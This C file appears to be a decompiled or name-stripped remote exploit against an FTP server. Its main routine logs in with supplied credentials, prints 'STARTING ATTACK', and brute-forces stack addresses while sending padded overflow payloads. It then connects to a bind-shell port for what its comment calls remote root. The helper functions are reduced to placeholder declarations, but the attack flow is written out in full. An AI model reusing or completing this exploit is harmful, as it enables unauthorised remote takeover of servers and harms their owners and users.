#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  user ;
typedef  int /*<<< orphan*/  remotehost ;
typedef  int /*<<< orphan*/  pass ;

/* Variables and functions */
 int BINDPORT ; 
 scalar_t__ BUFSIZ ; 
 int PORT ; 
 int STACK_END ; 
 int STACK_START ; 
 int /*<<< orphan*/  FUNC0 (int,int,char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int,char*,char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 scalar_t__ FUNC9 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int /*<<< orphan*/  FUNC12 (int,char*,scalar_t__,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (int,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (int) ; 
 int /*<<< orphan*/  FUNC15 (char*,scalar_t__,char*,char*) ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC16 (char*,char*) ; 
 int /*<<< orphan*/  FUNC17 (char*) ; 
 int /*<<< orphan*/  FUNC18 (char*,char*,int) ; 
 int /*<<< orphan*/ * FUNC19 (char*,char*) ; 
 int /*<<< orphan*/  FUNC20 (char**) ; 

int FUNC21(int argc, char **argv) {
       char remotehost[255];
       char user[255];
       char pass[255];
       char pad[10];
       char *buf,*sendbuf;
       int stackaddr=STACK_START;
       int s,sr00t,i;

       FUNC7();
       if (argc < 4)
               FUNC20(argv);

       FUNC18(remotehost, argv[1], sizeof(remotehost));
       remotehost[sizeof(remotehost)-1]=0;
       FUNC18(user, argv[2], sizeof(user));
       user[sizeof(user)-1]=0;
       FUNC18(pass, argv[3], sizeof(pass));
       pass[sizeof(pass)-1]=0;

       FUNC10("connecting to %s:%d...", remotehost, PORT);
       FUNC6(stdout);

       s=FUNC2(remotehost, PORT);

       FUNC11(" ok.");
       buf=(char*)FUNC9(BUFSIZ+10);
       sendbuf=(char*)FUNC9(BUFSIZ+10);
       FUNC3(s, buf, sendbuf, user, pass);

       if (FUNC19(buf, "230")!=NULL) {
               FUNC10("OK - STARTING ATTACK\n");
               i=0;
               while (stackaddr <= STACK_END) {
                       FUNC10("+++ USING STACK ADDRESS 0x%.08x +++\n", stackaddr);

                       FUNC14(1);

                       if (i==1) {
                               FUNC16(pad, "A");
                       }

                       if (i==2) {
                               FUNC16(pad, "AA");
                       }

                       if (i==3) {
                               FUNC16(pad, "AAA");
                               i=0;
                       }

                       FUNC0(s, stackaddr, pad);
                       FUNC1(s);
                       s=FUNC2(remotehost, PORT);
                       FUNC3(s, buf, sendbuf, user, pass);

                       if (argv[4] != NULL) {
                               FUNC15(sendbuf, BUFSIZ, "CWD %s\r\n", argv[4]);
                               FUNC13(s, sendbuf, FUNC17(sendbuf), 0);
                               FUNC12(s, buf, BUFSIZ, 0);
                       }

                       if((sr00t=FUNC2(remotehost, BINDPORT)) > 0) {
                               /* XXX Remote r00t */
                               FUNC10("\nLet's get ready to rumble!\n");
                               FUNC4(sr00t);
                               FUNC5(0);
                       }

                       stackaddr+=16;
                       i++;
               }
       } else {
               FUNC10("\nLogin incorrect\n");
               FUNC5(1);
       }

       FUNC8(buf);
       FUNC8(sendbuf);
       return 0;
}